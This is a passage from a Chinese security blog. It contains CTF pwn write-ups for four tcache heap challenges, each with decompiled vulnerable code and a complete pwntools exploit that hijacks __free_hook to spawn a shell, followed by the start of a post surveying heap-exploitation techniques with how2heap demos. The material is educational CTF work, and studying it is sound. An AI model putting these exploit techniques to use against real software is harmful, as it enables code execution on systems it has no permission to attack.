( i &gt; 9 ) { puts(&quot;:(&quot;); return __readfsqword(0x28u) ^ v5; } if ( !chunk_add[i] ) break; } printf(&quot;Size:&quot;); size = read_int(); if ( size &gt; 0x2000 ) exit(-2); dest = malloc(size); if ( !dest ) exit(-1); printf(&quot;Data:&quot;); read_data(&amp;s, size); strcpy(dest, &amp;s); // null offbyone chunk_add[i] = dest; chunk_size[i] = size; return __readfsqword(0x28u) ^ v5; } 这里存在一个null offbyOne 漏洞。原因是strcpy复制字符串时会将null字节一起复制。这里malloc可以分配大小在0x2000以下的chunk，最多分配十个。这一题比较简单。 利用思路： 因为可以控制分配的chunk的大小，所以可以分配大小超过0x400的chunk，这超出了tcache的范围，所以不会被放入tcache中。构造好堆的布局，两个大小大于0x400的chunk中间要夹着一个在tcache范围的chunk。假设这三个chunk分别为chunk1、2、3。先free掉chunk1，然后通过chunk2利用null offbyOne 将chunk3的prev_size和prev_inuse清空。然后将chunk3的prev_size字段设为 chunk1+chunk2的size的和，free掉chunk3。就会触发unlink向前合并，合并后的chunk会加入unsorted bin中，这时分配一个大小为chunk1的chunk，则会从合并的chunk中分割出来，并且向chunk2中写如unsorted bin的地址，通过chunk2就可以泄露出libc地址。最后利用tcache_dup 往__free_hook里写入one_gadget来getshell。具体的看代码。 exp: from pwn import* context.log_level = &quot;debug&quot; context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;] p = process(&#39;./children_tcache&#39;) libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;) def new(size,content): p.recv() p.sendline(&quot;1&quot;) p.recvuntil(&quot;:&quot;) p.sendline(str(size)) p.recvuntil(&quot;:&quot;) p.sendline(content) def free(idx): p.recv() p.sendline(&quot;3&quot;) p.recvuntil(&quot;:&quot;) p.sendline(str(idx)) def put(idx): p.recv() p.sendline(&quot;2&quot;) p.recvuntil(&quot;:&quot;) p.sendline(str(idx)) new(0x410,&quot;a&quot;) new(0x28,&quot;a&quot;*0x28) new(0x5f0,&quot;a&quot;) new(0x20,&quot;a&quot;) #gap top chunk free(0) free(1) #clear chunk_2 prev_size and prev_inuse for i in range(9): new(0x28-i,&quot;a&quot;*(0x28-i)) free(0) new(0x28,&quot;a&quot;*0x20 + p64(0x420+0x30)) #0 free(2) #trigger unlink new(0x410,&quot;a&quot;) #1 malloc(0x410) then unsorted add will write in 0 put(0) leak = u64(p.recv(8)[:6].ljust(8,&#39;\x00&#39;)) libc_base = leak - libc.symbols[&#39;__malloc_hook&#39;] - 0x10 - 88 libc.address = libc_base free_hook = libc.symbols[&#39;__free_hook&#39;] one_gadget = 0xfccde + libc_base log.info(&quot;libc_base {}&quot;.format(hex(libc_base))) new(0x28,&quot;\n&quot;) #2 free(0) free(2) new(0x28,p64(free_hook)) new(0x28,&quot;\n&quot;) new(0x28,p64(one_gadget)) free(1) p.interactive() hitbxctf2018 gundam防护机制： ☁ gumdam checksec gundam [*] &#39;/home/zs0zrc/pwn/tcache/gumdam/gundam&#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 这一道题比前面两道都要简单一点，程序主要功能有4个 1.build_gundam 2.visit 3.destory 4.blow up the factory 漏洞出现在destory功能中，它将chunk释放后没有将相应的指针清空，导致了UAF。 __int64 destory() { unsigned int v1; // [rsp+4h] [rbp-Ch] unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); if ( count ) { printf(&quot;Which gundam do you want to Destory:&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v1); if ( v1 &gt; 8 || !array[v1] ) { puts(&quot;Invalid choice&quot;); return 0LL; } *array[v1] = 0; // UAF free(*(array[v1] + 8LL)); } else { puts(&quot;No gundam&quot;); } return 0LL; } 利用思路： 先利用visit功能泄露出libc地址。泄露地址前要先将tcache填满，不然chunk不会进入unsorted bin中。泄露出libc地址后可以用tcache_dup，往_free_hook中写入one_gadget。具体的细节看exp。 exp： from pwn import* context.log_level = &quot;debug&quot; context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;] target = &#39;./gundam&#39; p = process(target) libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;) def build(name,type): p.recv() p.sendline(&quot;1&quot;) p.recv() p.send(name) p.recv() p.sendline(str(type)) def visit(): p.recvuntil(&quot;Your choice : &quot;) p.sendline(&quot;2&quot;) def destory(idx): p.recv() p.sendline(&quot;3&quot;) p.recv() p.sendline(str(idx)) def blow_up(): p.recvuntil(&quot;Your choice : &quot;) p.sendline(&quot;4&quot;) for i in range(9): build(&quot;aaaa&quot;,1) for i in range(2,9): destory(i) destory(0) #unsorted destory(1) blow_up() for i in range(7): build(&quot;aaaa&quot;,1) build(&quot;bbbbbbbb&quot;,1) #7 build(&quot;aaaaaaaa&quot;,1) #8 visit() p.recvuntil(&quot;bbbbbbbb&quot;) leak = u64(p.recv(8)[:6].ljust(8,&#39;\x00&#39;)) log.info(&quot;leak ==&gt;{}&quot;.format(hex(leak))) libc_base = leak - 0x3dac78 libc.address = libc_base free_hook = libc.symbols[&#39;__free_hook&#39;] one_gadget = 0xfccde + libc_base log.info(&quot;libc_base ==&gt; {}&quot;.format(hex(libc_base))) destory(6) #为了后面tcache_dup可以分配三个chunk，所以要释放掉两个chunk destory(5) destory(7) destory(7) #double free blow_up() build(p64(free_hook),1) #tcache_dup build(&quot;aaaa&quot;,1) build(p64(one_gadget),1) destory(0) p.interactive() CodegateCTF2019 god-the-reum防护机制： ☁ god-the-reum checksec god-the-reum [*] &#39;/home/zs0zrc/pwn/tcache/god-the-reum/god-the-reum&#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 简单的逆了下，主要看main、create、withdraw还有那个developer的功能 main： __int64 __fastcall main(__int64 a1, char **a2, char **a3) { int v3; // ST18_4 int v4; // ST18_4 int v6; // ST18_4 char array[88]; // [rsp+20h] [rbp-60h] unsigned __int64 v8; // [rsp+78h] [rbp-8h] __int64 savedregs; // [rsp+80h] [rbp+0h] v8 = __readfsqword(0x28u); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 2, 0LL); while ( 1 ) { menu(); while ( getchar() != 10 ) ; switch ( &amp;savedregs ) { case 1u: create(&amp;array[16 * count]); break; case 2u: v3 = get_idx(); deposit(&amp;array[16 * v3]); break; case 3u: v4 = get_idx(); withdraw(&amp;array[16 * v4]); break; case 4u: show(array, 0LL); break; case 5u: puts(&quot;bye da.&quot;); return 0LL; case 6u: v6 = get_idx(); sub_1092(&amp;array[16 * v6]); break; default: sub_11B3(); break; } } } 它用一个char数组来存储分配的wallet。每个wallet包含一个随机生成的add 和 一个用来存储eth的chunk。 create函数： unsigned __int64 __fastcall create(void **a1) { char *v1; // rax unsigned int v2; // eax char v4; // [rsp+13h] [rbp-1Dh] char v5; // [rsp+13h] [rbp-1Dh] signed int i; // [rsp+14h] [rbp-1Ch] size_t size; // [rsp+18h] [rbp-18h] void *s; // [rsp+20h] [rbp-10h] unsigned __int64 v9; // [rsp+28h] [rbp-8h] v9 = __readfsqword(0x28u); s = malloc(0x82uLL); //用于存储随机生生成的addr if ( !s || count &gt; 4 ) //最多分配4个wallet { puts(&quot;wallet creation failed&quot;); exit(0); } memset(s, 0, 0x82uLL); v1 = s + strlen(s); *v1 = 30768; v1[2] = 0; v2 = time(0LL); srand(v2); for ( i = 0; i &lt;= 39; ++i ) //利用rand随机生成addr { v4 = rand() % 15; if ( v4 &gt; 9 ) v5 = rand() % 6 + 97; else v5 = v4 + 48; *(s + i + 2) = v5; } *a1 = s; printf(&quot;how much initial eth? : &quot;, 0LL); __isoc99_scanf(&quot;%llu&quot;, &amp;size); a1[1] = malloc(size); //存储eth的chunk大小没有限制 if ( a1[1] ) *a1[1] = size; ++count; sub_119B(); puts(&quot;Creating new wallet succcess !\n&quot;); sub_FD5(*a1, a1[1]); putchar(10); return __readfsqword(0x28u) ^ v9; } withdraw功能： unsigned __int64 __fastcall withdraw(__int64 a1) { __int64 v2; // [rsp+10h] [rbp-10h] unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(&quot;how much you wanna withdraw? : &quot;); __isoc99_scanf(&quot;%llu&quot;, &amp;v2); **(a1 + 8) -= v2; //将wallet的eth减少 if ( !**(a1 + 8) ) //如果wallet的eth为0，就将它的chunk释放掉 free(*(a1 + 8)); // 这里存在UAF，因为它没检查chunk是否释放过了 puts(&quot;withdraw ok !\n&quot;); return __readfsqword(0x28u) ^ v3; } developer功能: __int64 __fastcall developer(__int64 a1) { sub_119B(); puts(&quot;this menu is only for developer&quot;); puts(&quot;if you are not developer, please get out&quot;); sleep(1u); printf(&quot;new eth : &quot;); return __isoc99_scanf(&quot;%10s&quot;, *(a1 + 8)); // 修改wallet的eth，可以通过这个来修改被释放的wallet的fd指针 } 利用思路： 先分配一个大于tcache范围的wallet，利用它来泄露出libc地址。然后利用tcache_dup修改_free_hook 为one_gadget。这里的tcache_dup可以利用developer功能，直接修改tcache_chunk的fd指针。 exp: from pwn import* context.log_level = &quot;debug&quot; context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;] target = &#39;./god-the-reum&#39; p = process(target) libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;) def create(eth): p.recv() p.sendline(&quot;1&quot;) p.recv() p.sendline(str(eth)) def deposit(idx,eth): p.recv() p.sendline(&quot;2&quot;) p.recv() p.sendline(str(idx)) #p.recv() p.sendline(str(eth)) def withdraw(idx,eth): p.recv() p.sendline(&quot;3&quot;) p.recv() p.sendline(str(idx)) p.recv() p.sendline(str(eth)) def show(): p.recv() p.sendline(&quot;4&quot;) def cheth(idx,eth): p.recv() p.sendline(&quot;6&quot;) p.recv() p.sendline(str(idx)) p.recv() p.sendline(str(eth)) create(0x500)#0 create(0x80)#1 withdraw(0,0x500)#free 0 show() p.recvuntil(&quot;ballance&quot;) leak = int(p.recv(16),10) libc_base = leak - libc.symbols[&#39;__malloc_hook&#39;] - 0x10 - 88 libc.address = libc_base free_hook = libc.symbols[&#39;__free_hook&#39;] one_gadget = 0xfccde + libc_base log.info(&quot;libc_base ==&gt; {}&quot;.format(hex(libc_base))) log.info(&quot;free_hook ==&gt; {}&quot;.format(hex(free_hook))) withdraw(1,0x80) cheth(1,p64(free_hook)) #change fd create(0x80)#2 free_hook p.recv() p.sendline(&quot;6&quot;) p.recv() p.sendline(&quot;2&quot;) p.recv() p.sendline(p64(one_gadget)) #write free_hook create(0x80)#3 withdraw(3,0x80) p.interactive() hitcon2018 baby_tcache防护机制： ☁ baby_tcache checksec baby_tcache [*] &#39;/home/zs0zrc/pwn/tcache/baby_tcache/baby_tcache&#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled 漏洞点： int create() { _QWORD *v0; // rax signed int i; // [rsp+Ch] [rbp-14h] _BYTE *v3; // [rsp+10h] [rbp-10h] unsigned __int64 size; // [rsp+18h] [rbp-8h] for ( i = 0; ; ++i ) { if ( i &gt; 9 ) { LODWORD(v0) = puts(&quot;:(&quot;); return (signed int)v0; } if ( !chunk_add[i] ) break; } printf(&quot;Size:&quot;); size = sub_B27(); if ( size &gt; 0x2000 ) exit(-2); v3 = malloc(size); if ( !v3 ) exit(-1); printf(&quot;Data:&quot;); sub_B88((__int64)v3, size); v3[size] = 0; // nulL offbyOne chunk_add[i] = v3; v0 = chunk_size; chunk_size[i] = size; return (signed int)v0; } 这道题的漏洞点和children_tcache一样，具体的做法和children_tcache差不多，都是通过null offbyOne漏洞 构造overlapping chunk。但是这题少了输出功能，所以要想办法泄露libc。这里泄露libc的涉及到了IO_FILE的利用，通过修改 puts函数工作过程中stdout 结构体中的 _IO_write_base ，来达到泄露libc地址信息的目的。 简单的分析下puts函数的函数调用链 puts函数在源码中是由 _IO_puts实现的，而 _IO_puts 函数内部会调用 _IO_sputn，结果会执行 _IO_new_file_xsputn,最终会执行 _IO_overflow _IO_puts源码： int _IO_puts (const char *str) { int result = EOF; _IO_size_t len = strlen (str); _IO_acquire_lock (_IO_stdout); if ((_IO_vtable_offset (_IO_stdout) != 0 || _IO_fwide (_IO_stdout, -1) == -1) &amp;&amp; _IO_sputn (_IO_stdout, str, len) == len &amp;&amp; _IO_putc_unlocked (&#39;\n&#39;, _IO_stdout) != EOF) result = MIN (INT_MAX, len + 1); _IO_release_lock (_IO_stdout); return result; } _IO_new_file_overflow int _IO_new_file_overflow (_IO_FILE *f, int ch) { if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */ { f-&gt;_flags |= _IO_ERR_SEEN; __set_errno (EBADF); return EOF; } /* If currently reading or no buffer allocated. */ if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL) ...... ...... } if (ch == EOF) return _IO_do_write (f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base); //目标 if (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) /* Buffer is really full */ if (_IO_do_flush (f) == EOF) return EOF; *f-&gt;_IO_write_ptr++ = ch; if ((f-&gt;_flags &amp; _IO_UNBUFFERED) || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == &#39;\n&#39;)) if (_IO_do_write (f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF) return EOF; return (unsigned char) ch; } 可以发现_IO_do_write是最后调用的函数， 而 _IO_write_base 是我们要修改的目标。这里f-&gt; _flags &amp; _IO_NO_WRITES的值应该是0，同时使 f-&gt; _flags &amp; _IO_CURRENTLY_PUTTING 的值为1，避免执行不必要的代码。 _IO_do_write函数的参数为stdout结构体、 _IO_write_base 和要打印的size。而 _IO_do_write实际会调用 new_do_write，参数一样。 static _IO_size_t new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do) { _IO_size_t count; if (fp-&gt;_flags &amp; _IO_IS_APPENDING) fp-&gt;_offset = _IO_pos_BAD; else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base) { _IO_off64_t new_pos = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, 1); if (new_pos == _IO_pos_BAD) return 0; fp-&gt;_offset = new_pos; } count = _IO_SYSWRITE (fp, data, to_do); //最终输出 if (fp-&gt;_cur_column &amp;&amp; count) fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - 1, data, count) + 1; _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base); fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base; fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= 0 &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED)) ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end); return count; } 其中_IO_SYSWRITE 就是我们的目标，这相当于 write(fp , data, to_do)。 _IO_SYSSEEK只是简单的调用lseek，但是我们不能完全控制fp-&gt; _IO_write_base - fp-&gt; _IO_read_end 的值。如果 fp-&gt; _IO_read_end的值设为0,那么 _IO_SYSSEEK的第二个参数的值就会过大。如果设置fp-&gt; _IO_write_base = fp-&gt; _IO_read_end 的话，那么在其他地方就会有问题，因为fp-&gt; _IO_write_base 不能大于fp-&gt; _IO_write_end 。所以这里要 设置fp- _flags | _IO_IS_APPENDING，避免进入else if分支中。 IO_FILE 的flags标志的一些宏 #define _IO_MAGIC 0xFBAD0000 /* Magic number */ #define _IO_MAGIC_MASK 0xFFFF0000 #define _IO_USER_BUF 0x0001 /* Don&#39;t deallocate buffer on close. */ #define _IO_UNBUFFERED 0x0002 #define _IO_NO_READS 0x0004 /* Reading not allowed. */ #define _IO_NO_WRITES 0x0008 /* Writing not allowed. */ #define _IO_EOF_SEEN 0x0010 #define _IO_ERR_SEEN 0x0020 #define _IO_DELETE_DONT_CLOSE 0x0040 /* Don&#39;t call close(_fileno) on close. */ #define _IO_LINKED 0x0080 /* In the list of all open files. */ #define _IO_IN_BACKUP 0x0100 #define _IO_LINE_BUF 0x0200 #define _IO_TIED_PUT_GET 0x0400 /* Put and get pointer move in unison. */ #define _IO_CURRENTLY_PUTTING 0x0800 #define _IO_IS_APPENDING 0x1000 #define _IO_IS_FILEBUF 0x2000 /* 0x4000 No longer used, reserved for compat. */ #define _IO_USER_LOCK 0x8000 _flags=_IO_MAGIC+_IO_CURRENTLY_PUTTING+_IO_IS_APPENDING+（_IO_LINKED） _flags=0xfbad1800 or 0xfbad1880 或者再加一些其他不影响leak的_flags _flag的构造满足的条件: _flags = 0xfbad0000 _flags &amp; = ~_IO_NO_WRITES // _flags = 0xfbad0000 _flags | = _IO_CURRENTLY_PUTTING // _flags = 0xfbad0800 _flags | = _IO_IS_APPENDING // _flags = 0xfbad1800 IO_FILE的部分就差不多这么多了，下面要解决怎么劫持stdout的问题。 劫持stdout利用的是null offbyOne构造overlapping chunk，往tcache中的chunk写入 main_arena + 88。然后利用double free，partial overwrite fd指针的后两位，使tcache中chunk的fd指针指向stdout。最后分配到包含stdout的chunk，就可以修改stdout结构体了。这个partial overwrite需要爆破，日常非洲人，爆破到怀疑人生。通过stdout结构体泄露出libc地址后就是常规做法了，利用tcache_dup 往__free_hook 中写入one_gadget来getshell。 exp: from pwn import* #context.log_level = &quot;debug&quot; context.terminal =[&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;] #p = process(&#39;./baby_tcache&#39;) def new(content,size): p.recvuntil(&quot;Your choice: &quot;) p.sendline(&#39;1&#39;) p.recvuntil(&quot;Size:&quot;) p.sendline(str(size)) p.recvuntil(&quot;Data:&quot;) p.send(content) def delete(idx): p.recvuntil(&quot;Your choice: &quot;) p.sendline(&#39;2&#39;) p.recv() p.sendline(str(idx)) def exp(): new(&quot;aaaa&quot;,0x410)#0 new(&quot;cccc&quot;,0x70)#1 new(&quot;dddd&quot;,0x5f0)#2 new(&quot;eeee&quot;,0x30)#3 delete(0) delete(1) new(&quot;a&quot;*0x70 + p64(0x420+0x80),0x78) #0 delete(2)# trigger delete(0) new(&quot;aaaa&quot;,0x410)#0 new(&#39;\x20\xb7&#39;,0x88)#1 change tcache-&gt;fd to stdout new(&#39;a&#39;,0x78)#2 fake_file = p64(0xfbad1800) + p64(0)*3 + &quot;\x00&quot; new(fake_file,0x78)#4 data = p.recv(0x20) leak = u64(data[0x18:]) #0x7f0000000000 if leak&amp;0x7f0000000000==0x7f0000000000: #判断是否成功修改stdout,泄露出地址 libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;) log.info(&quot;leak_add ==&gt; {}&quot;.format(hex(leak))) libc_base = leak - libc.symbols[&#39;_IO_file_jumps&#39;] libc.address = libc_base free_hook = libc.symbols[&#39;__free_hook&#39;] one_gadget = 0xfccde + libc_base log.info(&quot;libc_base ==&gt; {}&quot;.format(hex(libc_base))) delete(1) delete(2) #tcache_dup new(p64(free_hook),0x88) new(&#39;\n&#39;,0x88) new(p64(one_gadget),0x88) delete(3) p.interactive() else: p.close() if __name__ == &#39;__main__&#39;: while True: try: p = process(&#39;./baby_tcache&#39;) exp() except Exception as e: p.close() continue]]></content>
      <categories>
        <category>Heap_Exploitation</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>tcache</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[堆利用的一些总结]]></title>
    <url>%2F2019%2F03%2F08%2F2018-9-30-%E5%A0%86%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[最近闲来无事，就把学过的堆的利用总结一下。这里只是总结一下利用的思路，基础知识就不讲了，可能会贴上些glibc的源码。 一些学习网站CTF-WIKI入门网站 CTF-ALL-IN-ONE对堆的利用的原理讲的很清楚 Heap Exploitation国外作者写的，感觉还行 source code of malloc.c在线阅读glibc的源码，很方便 UAFUAF也就是use after free，这种情况的产生是因为free掉了chunk后没有将它的指针置为空。所以在被free掉后还可以被使用。 用处： 泄露信息，比如说泄露libc的地址 与fastbins attack结合，分配到包含想要控制的地址的chunk 进行unsortedbin attack，向一个地址内写入一个很大的值 unsafe unlinkunlink的目的：把一个双向链表中的空闲块拿出来，然后和目前物理相邻的 free chunk 进行合并。这实际上是对chunk的fd和bk指针的操作，fd_nextsize和bk_nextsize只有在chunk是large bins chunk时才会用到，而一般情况下很少用到。 unlink攻击的前提条件： 程序必须有某个地方存储着malloc返回的chunk地址，例如bss段中存放chunk地址的全局数组变量 unsafe_unlink攻击的本质，是对fd和bk这两个指针的利用 FD = P-&gt;fd; BK = P-&gt;bk; FD-&gt;bk = BK; BK-&gt;fd = FD; 因为unlink会有一个check,检查chunk的fd和bk是否被恶意修改了，所以为了绕过检查 FD和BK只能修改成特定的值，假设ptr上存储着P的地址 (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) 64位下 FD = ptr - 0x18 BK = ptr- 0x10 unlink实际做了 *(ptr - 0x18 + 0x18) = ptr - 0x10 *(ptr - 0x10 - 0x10) = ptr - 0x18 #主要看这步 等价于 *ptr = ptr - 0x18 通过unlink攻击可以控制 并修改指向chunk的指针，如果程序有往chunk中写的操作，那么就可以借此实现任意地址写 PWN中的unlink 攻击主要分两种： 向前合并的unlink(这里的前是指高地址的chunk) 向后合并的unlink(这里的后是指低地址的chunk)这两者要构造的chunk有点不一样下面一律假设 free掉的chunk为P，存储着P地址的地址 为ptr 向后合并源码：if (!prev_inuse(p)) { prevsize = prev_size (p); size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); unlink(av, p, bck, fwd); } 根据P的size字段的flag位，判断前一个chunk是否正在使用 如果前一个chunk是free状态，修改size大小 修改指向P的指针，改为指向前一个chunk 利用unlink将前一个chunk从bins链表中移除这里构造的话要在前一个chunk中伪造一个fake_chunk,fake_chunk的fd和bk指针要为特定值， 同时通过存在的漏洞控制当前chunk的prev_size字段和size字段，使其prev_size的大小的 fake_chunk的大小，size字段中的prev_inuse标志位为0构造的payload //假设 前一个chunk的大小为0xa0, P的大小为0x90 64位的 fake_chunk = p64(0) + p64(0x90) + p64(ptr - 0x18) + p64(ptr - 0x10) fake_chunk = fake_chunk.ljust(0x90,&#39;a&#39;) 32位的 fake_chunk = p32(0) + p32(0x90) + p32(ptr- 0x10) + p32(ptr - 0x8) fake_chunk = fake_chunk.ljust(0x90,&#39;a&#39;) 同时要修改P的prev_size为 0x90，size字段为0x90，使prev_inuse为0 最后free掉P就可以触发unlink了 2.向前合并源码： if (nextchunk != av-&gt;top) { /* get and clear inuse bit */ nextinuse = inuse_bit_at_offset(nextchunk, nextsize);/*这里检查下下个chunk的flag标志位*/ /* consolidate forward */ if (!nextinuse) { unlink(av, nextchunk, bck, fwd); size += nextsize; } #define inuse_bit_at_offset(p, s)\ (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size &amp; PREV_INUSE) 检查下下个chunk的prev_inuse标志位 如果prev_inuse为0，就进行unlink，将P从链表中取出 然后修改P的size字段这里利用要构造的chunk和向后合并不一样，它要能控制P的下下个chunk的size字段 上面的图是一个64位的简单的例子，chunk1已经设置好了fd和bk，此时只要free掉chunk0，就会检查是否可以向前合并，通过检查chunk0的下下个chunk的prev_inuse标志位，也就是chunk2的，这里chunk2的prev_ inuse已经被我设置为0了，这时就会进行向前合并，通过unlink宏将chunk1从链表中取出来。 大致的就是上面所说的，不过实际上会复杂很多。下面贴上unlink源码unlink源码： #define unlink(AV, P, BK, FD) { if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) /*检查chunk的size字段*/ malloc_printerr (&quot;corrupted size vs. prev_size&quot;); FD = P-&gt;fd; BK = P-&gt;bk; if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))/*检查chunk的fd 和bk是否正确，这里也是unlink要绕过的地方*/ malloc_printerr (&quot;corrupted double-linked list&quot;); else { FD-&gt;bk = BK; BK-&gt;fd = FD; if (!in_smallbin_range (chunksize_nomask (P)) &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) { if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0) || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0)) malloc_printerr (&quot;corrupted double-linked list (not small)&quot;); if (FD-&gt;fd_nextsize == NULL) { if (P-&gt;fd_nextsize == P) FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD; else { FD-&gt;fd_nextsize = P-&gt;fd_nextsize; FD-&gt;bk_nextsize = P-&gt;bk_nextsize; P-&gt;fd_nextsize-&gt;bk_nextsize = FD; P-&gt;bk_nextsize-&gt;fd_nextsize = FD; } } else { P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize; P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize; } } } } top_chunktopchunk简单的玩法就是house_of_force，分配出包含想要控制的地址的chunk，一般来说用来修改got表的内容，或者是修改_malloc_hook或者free_hook的内容。还有一种玩法就是往特定的地址写入特定的值，这个和topchunk的分配机制有关。 详情参考我这篇博客 how2heap系列—————————–2019.3.8更新 最近在整理自己的知识体系，读了一下malloc的源码，顺便看了下how2heap上的利用例子。在这篇堆总结中记录一下。建议学习how2heap系列时，可以编译带调试信息的可执行文件，这样比较方便调试。其中一些的源码，我删除了一些没用的输出，精简了一下。 fastbin_dup源码 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; int main() { fprintf(stderr, &quot;This file demonstrates a simple double-free attack with fastbins.\n&quot;); fprintf(stderr, &quot;Allocating 3 buffers.\n&quot;); int *a = malloc(8); int *b = malloc(8); int *c = malloc(8); fprintf(stderr, &quot;1st malloc(8): %p\n&quot;, a); fprintf(stderr, &quot;2nd malloc(8): %p\n&quot;, b); fprintf(stderr, &quot;3rd malloc(8): %p\n&quot;, c); fprintf(stderr, &quot;Freeing the first one...\n&quot;); free(a); fprintf(stderr, &quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;, a, a); // free(a); fprintf(stderr, &quot;So, instead, we&#39;ll free %p.\n&quot;, b); free(b); fprintf(stderr, &quot;Now, we can free %p again, since it&#39;s not the head of the free list.\n&quot;, a); free(a); fprintf(stderr, &quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&#39;ll get %p twice!\n&quot;, a, b, a, a); fprintf(stderr, &quot;1st malloc(8): %p\n&quot;, malloc(8)); fprintf(stderr, &quot;2nd malloc(8): %p\n&quot;, malloc(8)); fprintf(stderr, &quot;3rd malloc(8): %p\n&quot;, malloc(8)); } 这个例子主要是展示了fastbin的Double free，这个指的是fastbin中chunk可以被free多次，所以可以在fastbin链表中存在多次。导致了多次分配可以从fastbin中取出同一块chunk。 这个能成功的原因： 放入fastbins中的chunk对应的nextChunk 的prev_inuse标志位没有清空 fastbin在执行free时只验证了fasttop的chunk，对后面的chunk没有进行检查 运行结果 ☁ how2heap [master] ⚡ ./fastbin_dup This file demonstrates a simple double-free attack with fastbins. Allocating 3 buffers. 1st malloc(8): 0xc01010 2nd malloc(8): 0xc01030 3rd malloc(8): 0xc01050 Freeing the first one... If we free 0xc01010 again, things will crash because 0xc01010 is at the top of the free list. So, instead, we&#39;ll free 0xc01030. Now, we can free 0xc01010 again, since it&#39;s not the head of the free list. Now the free list has [ 0xc01010, 0xc01030, 0xc01010 ]. If we malloc 3 times, we&#39;ll get 0xc01010 twice! 1st malloc(8): 0xc01010 2nd malloc(8): 0xc01030 3rd malloc(8): 0xc01010 fastbin_dup_consolidate源码 #include &lt;stdio.h&gt; #include &lt;stdint.h&gt; #include &lt;stdlib.h&gt; int main() { void* p1 = malloc(0x40); void* p2 = malloc(0x40); fprintf(stderr, &quot;Allocated two fastbins: p1=%p p2=%p\n&quot;, p1, p2); fprintf(stderr, &quot;Now free p1!\n&quot;); free(p1); void* p3 = malloc(0x400); fprintf(stderr, &quot;Allocated large bin to trigger malloc_consolidate(): p3=%p\n&quot;, p3); fprintf(stderr, &quot;In malloc_consolidate(), p1 is moved to the unsorted bin.\n&quot;); free(p1); fprintf(stderr, &quot;Trigger the double free vulnerability!\n&quot;); fprintf(stderr, &quot;We can pass the check in malloc() since p1 is not fast top.\n&quot;); fprintf(stderr, &quot;Now p1 is in unsorted bin and fast bin. So we&#39;will get it twice: %p %p\n&quot;, malloc(0x40), malloc(0x40)); } 这个主要是展示了一下利用malloc_consolidate函数来进行Double free。 当在fastbin 中不存在满足分配需求的chunk时，会执行malloc_consolidate函数，这个函数主要的功能是将fastbin中的chunk拿出来，检查它们物理相邻的chunk是否处于free状态，如果处于就合并，然后将合并后的chunk放入unsortedbin中，如果是与topchunk相邻，就直接和top_chunk合并。 运行结果: ☁ glibc_2.25 [master] ⚡ ./fastbin_dup_consolidate Allocated two fastbins: p1=0x993010 p2=0x993060 Now free p1! Allocated large bin to trigger malloc_consolidate(): p3=0x9930b0 In malloc_consolidate(), p1 is moved to the unsorted bin. Trigger the double free vulnerability! We can pass the check in malloc() since p1 is not fast top. Now p1 is in unsorted bin and fast bin. So we&#39;will get it twice: 0x993010 0x993010 简单分析下流程 先分配两个大小为0x40的chunkp1、p2，然后将p1 free掉， p1会被放入fastbins中 pwndbg&gt; heapinfo (0x20) fastbin[0]: 0x0 (0x30) fastbin[1]: 0x0 (0x40) fastbin[2]: 0x0 (0x50) fastbin[3]: 0x602000 --&gt; 0x0 (0x60) fastbin[4]: 0x0 (0x70) fastbin[5]: 0x0 (0x80) fastbin[6]: 0x0 (0x90) fastbin[7]: 0x0 